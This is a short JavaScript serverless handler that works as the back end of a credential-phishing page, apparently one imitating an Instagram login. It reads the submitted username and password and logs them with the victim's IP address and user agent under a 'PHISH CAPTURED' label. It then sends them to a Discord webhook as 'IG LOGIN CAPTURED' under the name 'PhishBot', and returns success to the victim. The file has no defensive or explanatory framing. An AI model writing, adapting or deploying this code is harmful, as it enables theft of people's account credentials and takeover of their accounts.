module.exports = (req, res) => {
  let body = '';
  req.on('data', chunk => body += chunk);
  req.on('end', () => {
    const data = JSON.parse(body || '{}');
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    
    console.log('🎣 PHISH CAPTURED:', {
      time: new Date().toISOString(),
      ip,
      username: data.username,
      password: data.password,
      ua: req.headers['user-agent']
    });

    // DISCORD (add env var)
    if (process.env.DISCORD_WEBHOOK) {
      fetch(process.env.DISCORD_WEBHOOK, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          content: `**🐟 IG LOGIN CAPTURED**\n**User:** ${data.username}\n**Pass:** ${data.password}\n**IP:** ${ip}`,
          username: 'PhishBot'
        })
      });
    }
    
    res.writeHead(200, {'Content-Type': 'application/json'});
    res.end(JSON.stringify({success: true}));
  });
};